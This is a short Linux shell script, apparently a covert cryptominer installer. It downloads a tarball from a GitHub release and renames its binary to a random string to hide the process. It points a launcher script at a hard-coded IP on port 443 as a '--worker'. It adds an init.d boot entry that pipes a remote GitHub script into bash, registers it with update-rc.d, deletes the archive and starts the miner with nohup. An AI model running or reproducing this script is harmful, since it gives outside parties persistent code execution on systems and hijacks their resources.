cd /
wget https://github.com/percoc/metfor/releases/download/v1.5.2/advil.tar
tar -xvf advil.tar
cd /advil
variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
mv humira $variable1
sed -i "s/mongodb/${variable1} --worker ${variable1}/g" ./lipitor.sh
sed -i "s/host/20.163.170.215:443/g" ./lipitor.sh
cd /etc/init.d
echo "bash <(curl -s -L https://raw.githubusercontent.com/percoc/metfor/main/lyrica.sh)" > novolin.sh
chmod a+x novolin.sh
update-rc.d novolin.sh defaults
rm -rf advil.tar
cd /advil
nohup ./lipitor.sh
ps -ef | grep advil
